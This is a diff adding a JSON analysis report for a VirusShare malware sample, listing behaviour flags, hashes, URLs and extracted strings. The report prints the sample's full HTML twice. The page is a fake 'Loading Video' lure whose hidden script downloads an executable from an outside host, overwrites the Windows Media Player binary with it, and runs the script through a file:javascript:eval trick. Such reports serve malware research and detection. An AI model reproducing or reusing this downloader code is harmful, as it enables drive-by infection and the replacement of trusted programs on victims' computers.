@@ -1,0 +1,80 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "ADODB.Stream": "May create a text file",
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "Microsoft.XMLHTTP": "May download files from the Internet",
+            "Open": "May open a file",
+            "SaveToFile": "May create a text file",
+            "Write": "May write to a file",
+            "windows": "May enumerate application windows"
+        },
+        "macro": "<html>\n<h1>Loading Video<br>Please Wait</h1>\n<h3>If video doesn't load within 30 seconds, then your media player is incompatible.<br>\nYou can download the latest windows media player from <a href=\"http://www.microsoft.com/windows/windowsmedia/download/default.asp\">http://www.microsoft.com/windows/windowsmedia/download/default.asp</a>\n<textarea id=\"code\" style=\"display:none;\">\nvar x = new ActiveXObject(\"Microsoft.XMLHTTP\");\nx.Open(\"GET\", \"http://d60-65-226-229.col.wideopenwest.com:3978/windowsMedia.exe\",0);\nx.Send();\nvar s = new ActiveXObject(\"ADODB.Stream\");\ns.Mode = 3;\ns.Type = 1;\ns.Open();\ns.Write(x.responseBody);\ns.SaveToFile(\"C:\\\\Program Files\\\\Windows Media Player\\\\wmplayer.exe\",2);\nlocation.href = \"mms://\";\n</textarea>\n<script language=\"javascript\">\nfunction preparecode(code) {\nresult = '';\nlines = code.split(/\\r\\n/);\nfor (i=0;i<lines.length;i++) {\nline = lines[i];\nline = line.replace(/^\\s+/,\"\");\nline = line.replace(/\\s+$/,\"\");\nline = line.replace(/'/g,\"\\\\'\");\nline = line.replace(/[\\\\]/g,\"\\\\\\\\\");\nline = line.replace(/[/]/g,\"%2f\");\nif (line != '') {\nresult += line +'\\\\r\\\\n';\n}\n}\nreturn result;\n}\nfunction doit() {\nmycode = preparecode(document.all.code.value);\nmyURL = \"file:javascript:eval('\" + mycode + \"')\";\nwindow.open(myURL,\"_media\");\n}\nwindow.open(\"error.jsp\",\"_media\");\nsetTimeout(\"doit()\", 5000);\n</script>"
+    },
+    "filename": "VirusShare_4b259c13907cd3a2bdf83c996d814fd5",
+    "filesize": 1378,
+    "filetype": "HTML document, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "4b259c13907cd3a2bdf83c996d814fd5",
+        "sha1": "117296e3758625719e14d36546d63f1bb04d6701",
+        "sha256": "b179dff2fc3c2f87a8e0e45dd993b92bbafc4c1eabda90f3b1bf3db6e753028f"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<html>",
+            "<h1>Loading Video<br>Please Wait</h1>",
+            "<h3>If video doesn't load within 30 seconds, then your media player is incompatible.<br>",
+            "You can download the latest windows media player from <a href=\"http://www.microsoft.com/windows/windowsmedia/download/default.asp\">http://www.microsoft.com/windows/windowsmedia/download/default.asp</a>",
+            "<textarea id=\"code\" style=\"display:none;\">",
+            "var x = new ActiveXObject(\"Microsoft.XMLHTTP\");",
+            "x.Open(\"GET\", \"http://d60-65-226-229.col.wideopenwest.com:3978/windowsMedia.exe\",0);",
+            "x.Send();",
+            "var s = new ActiveXObject(\"ADODB.Stream\");",
+            "s.Mode = 3;",
+            "s.Type = 1;",
+            "s.Open();",
+            "s.Write(x.responseBody);",
+            "s.SaveToFile(\"C:\\\\Program Files\\\\Windows Media Player\\\\wmplayer.exe\",2);",
+            "location.href = \"mms://\";",
+            "</textarea>",
+            "<script language=\"javascript\">",
+            "function preparecode(code) {",
+            "result = '';",
+            "lines = code.split(/\\r\\n/);",
+            "for (i=0;i<lines.length;i++) {",
+            "line = lines[i];",
+            "line = line.replace(/^\\s+/,\"\");",
+            "line = line.replace(/\\s+$/,\"\");",
+            "line = line.replace(/'/g,\"\\\\'\");",
+            "line = line.replace(/[\\\\]/g,\"\\\\\\\\\");",
+            "line = line.replace(/[/]/g,\"%2f\");",
+            "if (line != '') {",
+            "result += line +'\\\\r\\\\n';",
+            "return result;",
+            "function doit() {",
+            "mycode = preparecode(document.all.code.value);",
+            "myURL = \"file:javascript:eval('\" + mycode + \"')\";",
+            "window.open(myURL,\"_media\");",
+            "window.open(\"error.jsp\",\"_media\");",
+            "setTimeout(\"doit()\", 5000);",
+            "</script>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://d60-65-226-229.col.wideopenwest.com:3978/windowsMedia.exe",
+            "http://www.microsoft.com/windows/windowsmedia/download/default.asp",
+            "http://www.microsoft.com/windows/windowsmedia/download/default.asp</a"
+        ]
+    },
+    "time": "0:00:00.267279",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
